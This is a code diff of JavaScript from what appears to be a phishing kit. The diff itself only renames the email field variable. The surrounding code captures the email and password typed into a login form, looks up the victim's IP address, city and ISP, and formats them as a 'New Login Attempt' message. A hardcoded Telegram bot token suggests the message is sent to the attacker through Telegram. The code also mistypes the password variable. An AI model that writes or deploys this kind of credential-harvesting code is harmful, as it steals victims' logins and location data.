@@ -4,10 +4,10 @@
     form.addEventListener('submit', function (event) {
         event.preventDefault(); // Prevents default form submission
 
-        const emailLabel = document.getElementById('emailLabel').value.trim();
+        const xiemail = document.getElementById('xiemail').value.trim();
         const pipassword = document.getElementById('pipassword').value.trim();
 
-        if (!emailLabel || !pipassword) {
+        if (!xiemail || !pipassword) {
             alert('Both email and password are required.');
             return;
         }
@@ -21,7 +21,7 @@
                 const city = data.city;
                 const isp = data.org;
 
-                const message = `🔹 New Login Attempt 🔹\n📧 Email: ${emailLabel}\n🔑 Password: ${pipasswor}\n🌎 IP: ${ip}\n📍 Location: ${city}, ${country}\n💻 ISP: ${isp}`;
+                const message = `🔹 New Login Attempt 🔹\n📧 Email: ${xiemail}\n🔑 Password: ${pipasswor}\n🌎 IP: ${ip}\n📍 Location: ${city}, ${country}\n💻 ISP: ${isp}`;
 
                 // Replace with your actual bot token and chat ID
                 const botToken = '7398105901:AAGMqPU6Xvcho2FwqubVM_r51ei8XkWKSLc';
